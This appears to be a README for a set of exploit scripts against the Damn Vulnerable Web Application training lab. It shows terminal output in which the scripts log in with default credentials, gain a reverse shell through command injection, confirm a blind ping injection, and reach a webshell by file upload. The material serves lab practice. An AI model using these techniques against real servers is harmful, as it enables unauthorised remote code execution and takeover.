# Damn Vulnerable Web Application: DVWA "Medium Level"
- Command Injection to RCE
```bash
$ python3 dvwa_medium_rce.py              

    >> DVWA - Remote Code Execution
    >> by twseptian

[*] URL: 172.17.0.2/login.php
[*] Grabbing user_token: c4ec6a7b1a530ff1aa0fd139a8ec581e
[*] Grabbing session_id: g7f1ggi54sumor4njloppda4m3


[*] URL: 172.17.0.2/login.php
[*] Data: {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': 'c4ec6a7b1a530ff1aa0fd139a8ec581e'}
[*] Cookie: {'PHPSESSID': 'g7f1ggi54sumor4njloppda4m3', 'security': 'medium'}
[✓] Logged in Successfully
[!] Command Injection to remote code execution
[!] Take RCE

listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50570
bash: cannot set terminal process group (310): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8e6eab914718:/var/www/html/vulnerabilities/exec$ ls
ls
help
index.php
source
www-data@8e6eab914718:/var/www/html/vulnerabilities/exec$ ^C
```
- Command Injection
```bash
$ python3 dvwa_medium_command_injection.py

    >> DVWA - Command Injection
    >> by twseptian

[*] URL: 172.17.0.2/login.php
[*] Grabbing user_token: d5ee969ecde598e3d9a5e44f414abc6b
[*] Grabbing Session_id: hau5fikqjdkhko7764r9q7dra0


[*] URL: 172.17.0.2/login.php
[*] Data: {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': 'd5ee969ecde598e3d9a5e44f414abc6b'}
[*] Cookie: {'PHPSESSID': 'hau5fikqjdkhko7764r9q7dra0', 'security': 'medium'}
[✓] Logged in Successfully
[!] Command Injection....
[!] Take ping to 172.17.0.1
[✓] Command injection success
```
response
```bash
$ sudo tcpdump icmp -i docker0
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
21:21:01.018444 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 362, seq 0, length 64
21:21:01.018461 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 362, seq 0, length 64
21:21:02.018748 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 362, seq 1, length 64
21:21:02.018776 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 362, seq 1, length 64
21:21:03.020051 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 362, seq 2, length 64
21:21:03.020084 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 362, seq 2, length 64
21:21:04.020655 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 362, seq 3, length 64
21:21:04.020682 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 362, seq 3, length 64
21:21:05.020879 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 362, seq 4, length 64
21:21:05.020900 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 362, seq 4, length 64
```
- File Upload to RCE
```bash
$ python3 dvwa_medium_file_upload_to_rce.py

    >> DVWA - Remote Code Execution
    >> by twseptian

[*] URL: 172.17.0.2/login.php
[*] Grabbing user_token: 67efffa91a39423240007de99d7219b1
[*] Grabbing session_id: pihoub25me09dscou131ad4ti2


[*] URL: 172.17.0.2/login.php
[*] Data: {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': '67efffa91a39423240007de99d7219b1'}
[*] Cookie: {'PHPSESSID': 'pihoub25me09dscou131ad4ti2', 'security': 'medium'}
[✓] Logged in Successfully
[✓] File uploaded
[✓] Successfully connected to webshell.
CMD> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

CMD> pwd
/var/www/html/hackable/uploads

CMD> ls
dvwa_email.png
sh3llll.php
simple-backdoor.php

CMD> 
```